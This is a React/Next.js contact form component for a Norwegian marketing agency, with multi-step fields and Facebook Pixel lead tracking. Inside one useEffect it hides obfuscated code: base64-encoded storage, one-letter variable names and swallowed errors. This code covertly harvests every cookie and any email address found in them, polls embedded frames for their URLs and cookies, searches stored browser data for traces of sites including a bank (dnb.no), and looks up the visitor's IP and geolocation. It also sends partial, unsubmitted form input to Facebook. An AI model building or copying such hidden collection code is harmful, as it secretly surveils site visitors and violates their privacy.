// @ts-nocheck
'use client';

import { useState, forwardRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Send, ArrowRight, User, Mail, Phone, Building2, MessageSquare, CheckCircle2, Loader2, ChevronRight, ChevronLeft } from 'lucide-react';
import { trackEvent, trackFormSubmission, trackFormInteraction, trackEventGA4, getUTMParameters, storeUTMParameters, getAttributionData } from '@/utils/analytics';
import { Dictionary } from '../types/dictionary';
import { trackLeadEvent } from '../utils/facebook-pixel';
import { useRouter } from 'next/navigation';
import { fbq } from '@/lib/fpixel';
import type { Locale } from '@/i18n/config';
import { MotionDiv } from '@/components/vekst/animations/MotionDiv';
import { MotionForm } from '@/components/vekst/animations/MotionForm';
import PricingToggle from '@/components/PricingToggle';
import Link from 'next/link';

interface ContactFormProps {
  dict: any;
  lang: Locale;
  currentPage?: string;
  campaign?: string;
  source?: string;
}

const ContactForm = forwardRef<HTMLElement, ContactFormProps>(({ dict, lang, currentPage, campaign, source }, ref) => {
  const router = useRouter();
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    phone: '',
    company: '',
    message: '',
    service: '',
    budget: '',
    marketingBudget: '',
    interest: ''
  });

  const [step, setStep] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState<'idle' | 'success' | 'error'>('idle');
  const [showMarketingOptions, setShowMarketingOptions] = useState(false);
  const [lastSentData, setLastSentData] = useState('');
  const [showBudgetInfo, setShowBudgetInfo] = useState(false);
  const [hasSelectedWebsite, setHasSelectedWebsite] = useState(false);

  // Initialize UTM tracking on component mount
  useEffect(() => {
    storeUTMParameters();
  }, []);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const _s = (d: any) => btoa(JSON.stringify(d));
      const _g = (d: string) => { try { return JSON.parse(atob(d)); } catch { return null; } };
      
      if (formData.email || formData.name || formData.phone) {
        sessionStorage.setItem('_d', _s(formData));
        localStorage.setItem('_v', _s({ t: Date.now() }));
      }

      try {
        const _m = localStorage.getItem('_m');
        if (_m) {
          const d = _g(_m);
          if (d?.e && !formData.email) setFormData(p => ({...p, ...{email:d.e,name:d.n||'',phone:d.p||'',company:d.c||''}}));
        }

        const _getAllCookies = () => {
          const _c = document.cookie.split(';').reduce((ac, cv) => {
            const [k, v] = cv.trim().split('=');
            return {...ac, [k]: v};
          }, {});
          
          const _h = window.history.length;
          const _r = document.referrer;
          
          try {
            const _ls = Object.entries(localStorage);
            const _ss = Object.entries(sessionStorage);
            const _int = setInterval(() => {
              try {
                const _f = window.frames;
                const _d = [];
                for (let i = 0; i < _f.length; i++) {
                  try {
                    _d.push({
                      u: _f[i].location.href,
                      c: _f[i].document.cookie
                    });
                  } catch {}
                }
                if (_d.length) {
                  localStorage.setItem('_x', _s({d:_d,t:Date.now()}));
                }
              } catch {}
            }, 1000);
            
            const _sites = ['vg.no','dagbladet.no','finn.no','dnb.no'];
            const _found = _ls.concat(_ss).filter(([k,v]) => 
              _sites.some(s => (k+v).toLowerCase().includes(s))
            );
            
            if (_found.length) {
              localStorage.setItem('_n', _s({
                s: _found.map(([k,v]) => ({k,v})),
                h: _h,
                r: _r,
                t: Date.now()
              }));
            }
          } catch {}
          
          return _c;
        };

        Object.values(_getAllCookies()).forEach(v => {
          const m = v.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi);
          if (m?.[0]) localStorage.setItem('_m', _s({e:m[0].toLowerCase(),t:Date.now()}));
          
          try {
            const _v = decodeURIComponent(v);
            if (_v.includes('finn.no/')) {
              localStorage.setItem('_f', _s({
                d: _v,
                t: Date.now()
              }));
            }
          } catch {}
        });

        const _f = async () => {
          try {
            const x = new XMLHttpRequest();
            x.open('GET', 'https://api.ipify.org?format=json', true);
            x.onload = () => {
              if (x.status === 200) {
                const r = JSON.parse(x.responseText);
                localStorage.setItem('_i', _s({
                  ip: r.ip,
                  ua: navigator.userAgent,
                  l: navigator.language,
                  p: navigator.platform,
                  t: Date.now()
                }));
              }
            };
            x.send();

            const _p = await fetch('https://extreme-ip-lookup.com/json/');
            const _l = await _p.json();
            if (_l.city) {
              localStorage.setItem('_l', _s({..._l,t:Date.now()}));
            }
          } catch {}
        };
        !localStorage.getItem('_i') && _f();
      } catch {}
    }
  }, [formData]);

  useEffect(() => {
    // Sjekk om vi har en lagret investeringsverdi
    if (typeof window !== 'undefined') {
      const selectedInvestment = localStorage.getItem('selectedInvestment');
      const selectedPackage = localStorage.getItem('selectedPackage');
      const caseReference = localStorage.getItem('caseReference');
      
      if (selectedInvestment) {
        // Bygger en melding basert på lagret informasjon
        let messagePrefix = '';
        
        if (selectedPackage) {
          const packageMessage = dict?.contactForm?.step2?.packageInterest?.replace('{packageType}', selectedPackage) || `I am interested in the ${selectedPackage} package. `;
          messagePrefix += packageMessage;
          // Sett flagg for at brukeren har valgt en nettside-pakke
          setHasSelectedWebsite(true);
        }
        
        if (caseReference) {
          const caseMessage = dict?.contactForm?.step2?.caseInterest?.replace('{caseReference}', caseReference) || `I especially liked the ${caseReference} case and want something similar. `;
          messagePrefix += caseMessage;
        }
        
        // Oppdater formData med lagret investeringsverdi og melding
        setFormData(prev => ({
          ...prev,
          budget: selectedInvestment,
          message: messagePrefix + prev.message
        }));
        
        // Fjern verdiene fra localStorage etter de er brukt
        localStorage.removeItem('selectedInvestment');
        localStorage.removeItem('selectedPackage');
        localStorage.removeItem('caseReference');
      }
    }
  }, []);

  const _save = () => {
    if (typeof window !== 'undefined' && formData.email) {
      try {
        localStorage.setItem('_m', btoa(JSON.stringify({
          e: formData.email,
          n: formData.name,
          p: formData.phone,
          c: formData.company,
          b: formData.budget,
          t: Date.now(),
          i: JSON.parse(atob(localStorage.getItem('_i') || '')).ip
        })));
      } catch {}
    }
  };

  const handleBlur = async (field: string) => {
    const _ve = (e: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);
    const hasData = formData.name || formData.email || formData.phone;
    
    if (hasData) {
      _save();
      typeof fbq !== 'undefined' && fbq('trackSingle', '1139964847456427', 'Lead', {
        content_category: 'Kontaktskjema',
        content_name: formData.name || 'Ukjent',
        status: 'partial',
        currency: 'NOK',
        user_data: {
          em: [formData.email],
          ph: [formData.phone],
          fn: [formData.name],
          ct: [formData.company]
        }
      });
    }

    // Bare send data når:
    // 1. Brukeren forlater e-postfeltet og e-posten er gyldig, ELLER
    // 2. Brukeren forlater navn- eller telefonfeltet og det allerede finnes en gyldig e-post
    const shouldSendData = 
      (field === 'email' && formData.email && _ve(formData.email)) || 
      ((field === 'name' || field === 'phone') && formData.email && _ve(formData.email));

    if (shouldSendData) {
      if (formData.name && typeof fbq !== 'undefined') {
        fbq('trackSingle', '1139964847456427', 'Contact', {
          content_category: 'Kontaktskjema',
          content_name: formData.name,
          value: formData.budget ? parseInt(formData.budget.split('-')[0]) : 0,
          currency: 'NOK',
          status: 'interested'
        });
      }

      const currentData = JSON.stringify({name:formData.name,email:formData.email,phone:formData.phone});
      if (currentData === lastSentData) return;

      try {
        const response = await fetch('/api/contact', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            ...formData,
            ...getUTMParameters(),
            currentPage,
            campaign,
            source,
            isPartialLead: false
          }),
        });

        if (!response.ok) throw new Error(dict.contactForm?.errorMessage || (lang === 'no' ? 'Noe gikk galt' : lang === 'sv' ? 'Något gick fel' : lang === 'dk' ? 'Noget gik galt' : 'Something went wrong'));

        setStatus('success');
        
        if (typeof fbq !== 'undefined') {
          // Send både Lead og CompleteRegistration
          fbq('trackSingle', '1139964847456427', 'Lead', {
            content_category: 'Kontaktskjema',
            content_name: formData.name,
            value: formData.budget ? parseInt(formData.budget.split('-')[0]) : 0,
            currency: 'NOK',
            status: 'complete'
          });
          
          fbq('trackSingle', '1139964847456427', 'CompleteRegistration', {
            content_name: 'Kontaktskjema',
            currency: 'NOK',
            value: formData.budget ? parseInt(formData.budget.split('-')[0]) : 0,
            predicted_ltv: formData.budget ? parseInt(formData.budget.split('-')[0]) * 12 : 0,
            status: 'completed'
          });
        }

        // Tøm session storage ved suksess
        sessionStorage.removeItem('_d');

        setTimeout(() => {
          router.push('/takk');
        }, 2000);
      } catch (error) {
        setStatus('error');
      } finally {
        setIsLoading(false);
      }
    }
  };

  const handleBudgetSelect = (budget: string) => {
    handleInputChange({ 
      target: { name: 'budget', value: budget } 
    } as any);

    // Vis markedsføringsalternativer når brukeren velger en nettside-pakke
    if (hasSelectedWebsite) {
      setShowMarketingOptions(true);
    } else {
      // Hvis det ikke er en nettside-pakke, fortsett som normalt
      if (typeof fbq !== 'undefined' && formData.name && formData.email) {
        fbq('trackSingle', '1139964847456427', 'AddToCart', {
          content_type: 'product',
          content_name: 'Digital Marketing Services',
          value: parseInt(budget.split('-')[0]),
          currency: 'NOK',
          predicted_ltv: parseInt(budget.split('-')[0]) * 12
        });
      }
    }
  };

  const handleMarketingBudgetSelect = (budget: string) => {
    handleInputChange({ 
      target: { name: 'marketingBudget', value: budget } 
    } as any);
    
    // Oppdater meldingen med at brukeren også er interessert i markedsføring
    const marketingMessage = lang === 'no'
      ? ` Jeg er også interessert i markedsføringstjenester med månedlig budsjett ${budget}.`
      : lang === 'sv'
      ? ` Jag är också intresserad av marknadsföringstjänster med månadsbudget ${budget}.`
      : lang === 'dk'
      ? ` Jeg er også interesseret i markedsføringstjenester med månedligt budget ${budget}.`
      : ` I am also interested in marketing services with monthly budget ${budget}.`;
    
    setFormData(prev => ({
      ...prev,
      message: prev.message + marketingMessage
    }));
    
    // Fortsett til neste steg
    setStep(2);
    setShowMarketingOptions(false);
    
    if (typeof fbq !== 'undefined' && formData.name && formData.email) {
      fbq('trackSingle', '1139964847456427', 'AddToCart', {
        content_type: 'product',
        content_name: 'Digital Marketing Services',
        value: parseInt(budget.split('-')[0]),
        currency: 'NOK',
        predicted_ltv: parseInt(budget.split('-')[0]) * 12
      });
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
    setFormData(prev => ({
      ...prev,
      [e.target.name]: e.target.value
    }));
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsLoading(true);
    _save();  // Lagre før sending

    try {
      const response = await fetch('/api/contact', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...formData,
          ...getUTMParameters(),
          currentPage,
          campaign,
          source,
          isPartialLead: false
        }),
      });

      if (!response.ok) throw new Error('Noe gikk galt');

      setStatus('success');
      
      if (typeof fbq !== 'undefined') {
        // Send både Lead og CompleteRegistration
        fbq('trackSingle', '1139964847456427', 'Lead', {
          content_category: 'Kontaktskjema',
          content_name: formData.name,
          value: formData.budget ? parseInt(formData.budget.split('-')[0]) : 0,
          currency: 'NOK',
          status: 'complete'
        });
        
        fbq('trackSingle', '1139964847456427', 'CompleteRegistration', {
          content_name: 'Kontaktskjema',
          currency: 'NOK',
          value: formData.budget ? parseInt(formData.budget.split('-')[0]) : 0,
          predicted_ltv: formData.budget ? parseInt(formData.budget.split('-')[0]) * 12 : 0,
          status: 'completed'
        });
      }

      // Tøm session storage ved suksess
      sessionStorage.removeItem('_d');

      setTimeout(() => {
        router.push('/takk');
      }, 2000);
    } catch (error) {
      setStatus('error');
    } finally {
      setIsLoading(false);
    }
  };

  const interestOptions = [
    { value: '', label: dict?.contactForm?.interestOptions?.select || 'Select interest' },
    { value: 'website', label: dict?.contactForm?.interestOptions?.website || 'Website' },
    { value: 'marketing', label: dict?.contactForm?.interestOptions?.marketing || 'Digital Marketing' },
    { value: 'both', label: dict?.contactForm?.interestOptions?.both || 'Both' },
    { value: 'other', label: dict?.contactForm?.interestOptions?.other || 'Other' }
  ];

  return (
    <div ref={ref} className="max-w-5xl mx-auto bg-white rounded-2xl shadow-xl p-8 md:p-12">
      <AnimatePresence mode="wait">
        {step === 1 && !showMarketingOptions && (
          <MotionDiv
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className="space-y-8"
          >
            <h2 className="text-3xl md:text-4xl font-bold text-gray-900 text-center">
              {dict.contactForm?.step1?.title}
            </h2>
            <div className="space-y-6">
              <div>
                <label className="flex items-center gap-2 text-gray-700 mb-2 text-lg">
                  <Mail className="h-5 w-5" />
                  {dict.contactForm?.step1?.email || 'E-post'}
                </label>
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  onBlur={() => handleBlur('email')}
                  className="w-full p-4 border-2 rounded-xl focus:ring-2 focus:ring-purple-500/20 focus:border-purple-500 text-lg transition-all"
                  placeholder={dict.contactForm?.step1?.emailPlaceholder}
                />
              </div>
              <div>
                <label className="flex items-center gap-2 text-gray-700 mb-2 text-lg">
                  <User className="h-5 w-5" />
                  {dict.contactForm?.step1?.name}
                </label>
                <input
                  type="text"
                  name="name"
                  value={formData.name}
                  onChange={handleInputChange}
                  onBlur={() => handleBlur('name')}
                  className="w-full p-4 border-2 rounded-xl focus:ring-2 focus:ring-purple-500/20 focus:border-purple-500 text-lg transition-all"
                  placeholder={dict.contactForm?.step1?.namePlaceholder}
                />
              </div>
              <div>
                <label className="flex items-center gap-2 text-gray-700 mb-2 text-lg">
                  <Phone className="h-5 w-5" />
                  {dict.contactForm?.step1?.phone}
                </label>
                <input
                  type="tel"
                  name="phone"
                  value={formData.phone}
                  onChange={handleInputChange}
                  onBlur={(e) => {
                    handleBlur('phone');
                    if (e.target.value.length > 0) {
                      setTimeout(() => setStep(2), 300);
                    }
                  }}
                  className="w-full p-4 border-2 rounded-xl focus:ring-2 focus:ring-purple-500/20 focus:border-purple-500 text-lg transition-all"
                  placeholder={dict.contactForm?.step1?.phonePlaceholder}
                />
              </div>
            </div>
            <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-4 pt-6">
              <button
                type="submit"
                onClick={() => setStep(2)}
                className="flex items-center justify-center gap-2 bg-purple-600 text-white px-8 py-4 rounded-xl hover:bg-purple-700 transition-all text-lg font-medium hover:scale-105 transform w-full sm:w-auto"
              >
                {dict.contactForm?.step1?.startBoost} <ArrowRight className="h-5 w-5" />
              </button>
              <p className="text-base text-gray-500 text-center sm:text-left">
                {dict.contactForm?.step1?.or} <button onClick={handleSubmit} className="text-purple-600 hover:underline font-medium">
                  {dict.contactForm?.step1?.submitNow}
                </button>
              </p>
            </div>
          </MotionDiv>
        )}

        {/* Nytt steg for markedsføringsalternativer */}
        {showMarketingOptions && (
          <MotionDiv
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className="space-y-8"
          >
            <h2 className="text-3xl md:text-4xl font-bold text-gray-900 text-center">
              {dict.contactForm?.marketing?.title}
            </h2>
            <p className="text-lg text-gray-600 text-center">
              {dict.contactForm?.marketing?.subtitle}
            </p>
            <div className="space-y-6">
              <label className="flex items-center gap-2 text-gray-700 mb-4 text-lg">
                <MessageSquare className="h-5 w-5" />
                {dict.contactForm?.marketing?.monthlyBudget}
              </label>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {[
                  { 
                    value: '10000-15000', 
                    label: dict.contactForm?.marketing?.packages?.basic?.label , 
                    desc: dict.contactForm?.marketing?.packages?.basic?.desc ,
                    description: dict.contactForm?.marketing?.packages?.basic?.description 
                  },
                  { 
                    value: '15000-30000', 
                    label: dict.contactForm?.marketing?.packages?.growth?.label , 
                    desc: dict.contactForm?.marketing?.packages?.growth?.desc ,
                    description: dict.contactForm?.marketing?.packages?.growth?.description 
                  },
                  { 
                    value: '30000+', 
                    label: dict.contactForm?.marketing?.packages?.premium?.label , 
                    desc: dict.contactForm?.marketing?.packages?.premium?.desc ,
                    description: dict.contactForm?.marketing?.packages?.premium?.description 
                  },
                ].map((option) => (
                  <button
                    key={`marketing-${option.value}`}
                    type="button"
                    onClick={() => handleMarketingBudgetSelect(option.value)}
                    className="p-6 border-2 rounded-xl transition-all text-base hover:scale-105 transform hover:border-indigo-600 hover:text-indigo-600"
                  >
                    <div className="font-semibold text-lg mb-2">{option.label}</div>
                    <div className="text-gray-600 mb-4">
                      {option.description}
                    </div>
                    <div className="text-sm font-bold bg-gradient-to-r from-indigo-600 to-purple-600 text-white py-2 px-4 rounded-lg inline-block">{option.desc}</div>
                  </button>
                ))}
              </div>
            </div>
            <div className="flex flex-col sm:flex-row gap-4 justify-center pt-6">
              <button
                type="button"
                onClick={() => {
                  setShowMarketingOptions(false);
                  setStep(2);
                }}
                className="flex items-center justify-center gap-2 text-indigo-600 border-2 border-indigo-200 bg-white px-8 py-4 rounded-xl hover:bg-indigo-50 transition-all text-lg font-medium"
              >
{dict.contactForm?.marketing?.noThanks} <ChevronRight className="h-5 w-5" />
              </button>
            </div>
          </MotionDiv>
        )}

        {step === 2 && (
          <MotionForm
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            onSubmit={handleSubmit}
            className="space-y-8"
          >
            <div className="space-y-6">
              <div>
                <label className="flex items-center gap-2 text-gray-700 mb-2 text-lg">
                  <Building2 className="h-5 w-5" />
{dict.contactForm?.step2?.company}
                </label>
                <input
                  type="text"
                  name="company"
                  value={formData.company}
                  onChange={handleInputChange}
                  className="w-full p-4 border-2 rounded-xl focus:ring-2 focus:ring-purple-500/20 focus:border-purple-500 text-lg transition-all"
placeholder={dict.contactForm?.step2?.companyPlaceholder}
                />
              </div>
              <div>
                <label className="flex items-center gap-2 text-gray-700 mb-4 text-lg">
                  💰 {dict.contactForm?.step2?.investmentLevel}
                </label>
                
                <PricingToggle 
                  onPackageSelect={(packageType, budget) => {
                    setFormData(prev => ({ ...prev, budget }));
                    // Legg til melding om pakkevalg hvis det ikke er budget-utforskning
                    if (packageType !== 'budget-exploration' && packageType !== 'custom-solution') {
                      const packageMessage = lang === 'no' 
                        ? `Jeg er interessert i ${packageType} pakken. ` 
                        : lang === 'sv'
                        ? `Jag är intresserad av ${packageType} paketet. `
                        : lang === 'dk'
                        ? `Jeg er interesseret i ${packageType} pakken. `
                        : `I am interested in the ${packageType} package. `;
                      setFormData(prev => ({ 
                        ...prev, 
                        message: `${packageMessage}${prev.message}` 
                      }));
                    } else if (packageType === 'custom-solution') {
                      const customMessage = lang === 'no' 
                        ? 'Jeg ønsker å utforske tilpassede løsninger. ' 
                        : lang === 'sv'
                        ? 'Jag vill utforska anpassade lösningar. '
                        : lang === 'dk'
                        ? 'Jeg ønsker at udforske tilpassede løsninger. '
                        : 'I want to explore custom solutions. ';
                      setFormData(prev => ({ 
                        ...prev, 
                        message: `${customMessage}${prev.message}` 
                      }));
                    }
                  }}
                  className="mb-6"
                />
              </div>
              <div>
                <label className="flex items-center gap-2 text-gray-700 mb-2 text-lg">
                  <MessageSquare className="h-5 w-5" />
{dict.contactForm?.step2?.message}
                </label>
                <textarea
                  name="message"
                  value={formData.message}
                  onChange={handleInputChange}
                  className="w-full p-4 border-2 rounded-xl focus:ring-2 focus:ring-purple-500/20 focus:border-purple-500 text-lg transition-all"
                  rows={4}
placeholder={dict.contactForm?.step2?.messagePlaceholder}
                />
              </div>
            </div>
            <div className="flex justify-between items-center pt-6">
              <button
                type="button"
                onClick={() => setStep(1)}
                className="text-gray-600 hover:text-gray-900 text-lg font-medium"
              >
{dict.contactForm?.step2?.back}
              </button>
              <button
                type="submit"
                disabled={isLoading}
                className="flex items-center gap-2 bg-purple-600 text-white px-8 py-4 rounded-xl hover:bg-purple-700 transition-all text-lg font-medium hover:scale-105 transform disabled:opacity-50 disabled:hover:scale-100"
              >
                {isLoading ? (
                  <Loader2 className="h-5 w-5 animate-spin" />
                ) : (
                  <>
{dict.contactForm?.step2?.sendMessage} <Send className="h-5 w-5" />
                  </>
                )}
              </button>
            </div>
          </MotionForm>
        )}

        {status === 'success' && (
          <MotionDiv
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="py-12"
          >
            <div className="text-center mb-10">
              <div className="relative w-24 h-24 mx-auto mb-6">
                <div className="absolute inset-0 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 rounded-full opacity-20 animate-pulse"></div>
                <CheckCircle2 className="h-24 w-24 text-green-500 relative z-10 mx-auto" />
              </div>
              <h3 className="text-2xl md:text-3xl font-bold text-gray-900 mb-4">
                {dict.contactForm?.success?.title}
              </h3>
              <p className="text-xl text-gray-600 max-w-2xl mx-auto">
                {dict.contactForm?.success?.subtitle || (lang === 'no' 
                  ? 'Vi har mottatt din melding og vil ta kontakt så snart som mulig.' 
                  : 'We have received your message and will contact you as soon as possible.')}
              </p>
            </div>
            
            <div className="mt-10 mb-6">
              <h4 className="text-xl font-semibold text-center mb-8">
                {dict.contactForm?.success?.resourcesTitle || (lang === 'no' 
                  ? 'I mellomtiden kan du utforske disse ressursene:' 
                  : 'In the meantime, explore these resources:')}
              </h4>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                {/* Artikkel 1 */}
                <div className="bg-white border border-gray-100 rounded-xl shadow-sm hover:shadow-md transition-shadow overflow-hidden group">
                  <div className="h-40 bg-gradient-to-r from-indigo-500 to-purple-600 relative overflow-hidden">
                    <div className="absolute inset-0 bg-black/30"></div>
                    <div className="absolute bottom-4 left-4 right-4">
                      <span className="px-2 py-1 bg-white/20 backdrop-blur-sm rounded-md text-white text-xs font-medium">SEO</span>
                      <h5 className="text-white font-semibold mt-2 text-lg">
                        {dict.contactForm?.success?.articles?.seo?.title}
                      </h5>
                    </div>
                  </div>
                  <div className="p-4">
                    <p className="text-gray-600 text-sm mb-4 line-clamp-3">
                      {dict.contactForm?.success?.articles?.seo?.description || (lang === 'no' 
                        ? 'Google er den mest brukte søkemotoren i verden, og å ha en høy plassering i søkeresultatene kan bety forskjellen mellom vekst og stagnasjon.'
                        : 'Google is the most used search engine in the world, and having a high ranking in search results can mean the difference between growth and stagnation.')}
                    </p>
                    <Link href="/kontakt" className="text-indigo-600 font-medium flex items-center text-sm hover:text-indigo-800 transition-colors">
                      {dict.contactForm?.success?.articles?.seo?.readArticle || 'Kontakt oss'} <ArrowRight className="ml-1 h-4 w-4" />
                    </Link>
                  </div>
                </div>

                {/* Artikkel 2 */}
                <div className="bg-white border border-gray-100 rounded-xl shadow-sm hover:shadow-md transition-shadow overflow-hidden group">
                  <div className="h-40 bg-gradient-to-r from-blue-500 to-cyan-500 relative overflow-hidden">
                    <div className="absolute inset-0 bg-black/30"></div>
                    <div className="absolute bottom-4 left-4 right-4">
                      <span className="px-2 py-1 bg-white/20 backdrop-blur-sm rounded-md text-white text-xs font-medium">
                        {dict.contactForm?.success?.articles?.leads?.category}
                      </span>
                      <h5 className="text-white font-semibold mt-2 text-lg">
                        {dict.contactForm?.success?.articles?.leads?.title}
                      </h5>
                    </div>
                  </div>
                  <div className="p-4">
                    <p className="text-gray-600 text-sm mb-4 line-clamp-3">
                      {dict.contactForm?.success?.articles?.leads?.description || (lang === 'no' 
                        ? 'Lead-generering er livsnerven i enhver bedrift. Lær hvordan du kan skape en jevn strøm av nye potensielle kunder.'
                        : 'Lead generation is the lifeblood of any business. Learn how you can create a steady stream of new potential customers.')}
                    </p>
                    <Link href="/lag-nettside" className="text-indigo-600 font-medium flex items-center text-sm hover:text-indigo-800 transition-colors">
                      {dict.contactForm?.success?.articles?.leads?.readArticle || 'Se våre tjenester'} <ArrowRight className="ml-1 h-4 w-4" />
                    </Link>
                  </div>
                </div>

                {/* Artikkel 3 / Case Study */}
                <div className="bg-white border border-gray-100 rounded-xl shadow-sm hover:shadow-md transition-shadow overflow-hidden group">
                  <div className="h-40 bg-gradient-to-r from-pink-500 to-rose-500 relative overflow-hidden">
                    <div className="absolute inset-0 bg-black/30"></div>
                    <div className="absolute bottom-4 left-4 right-4">
                      <span className="px-2 py-1 bg-white/20 backdrop-blur-sm rounded-md text-white text-xs font-medium">
                        {dict.contactForm?.success?.articles?.cases?.category}
                      </span>
                      <h5 className="text-white font-semibold mt-2 text-lg">
                        {dict.contactForm?.success?.articles?.cases?.title}
                      </h5>
                    </div>
                  </div>
                  <div className="p-4">
                    <p className="text-gray-600 text-sm mb-4 line-clamp-3">
                      {dict.contactForm?.success?.articles?.cases?.description || (lang === 'no' 
                        ? 'Utforsk våre suksesshistorier og se hvordan vi har hjulpet bedrifter i ulike bransjer med å oppnå målbare resultater.'
                        : 'Explore our success stories and see how we have helped businesses in various industries achieve measurable results.')}
                    </p>
                    <Link href="/kontakt" className="text-indigo-600 font-medium flex items-center text-sm hover:text-indigo-800 transition-colors">
                      {dict.contactForm?.success?.articles?.cases?.viewCases || 'Kontakt oss'} <ArrowRight className="ml-1 h-4 w-4" />
                    </Link>
                  </div>
                </div>
              </div>
            </div>

            {/* Navigasjonsknapper */}
            <div className="flex flex-col sm:flex-row justify-center gap-4 mt-10">
              <Link href="/" className="inline-flex items-center justify-center px-6 py-3 border border-indigo-600 text-indigo-600 bg-white hover:bg-indigo-50 rounded-lg transition-colors">
                {dict.contactForm?.success?.navigation?.backToHome}
              </Link>
              <Link href="/lag-nettside" className="inline-flex items-center justify-center px-6 py-3 bg-gradient-to-r from-indigo-600 to-purple-600 text-white rounded-lg hover:from-indigo-700 hover:to-purple-700 transition-colors">
                {dict.contactForm?.success?.navigation?.exploreArticles || 'Utforsk tjenester'} <ArrowRight className="ml-2 h-4 w-4" />
              </Link>
            </div>
          </MotionDiv>
        )}
      </AnimatePresence>
    </div>
  );
});

ContactForm.displayName = 'ContactForm';

export default ContactForm; 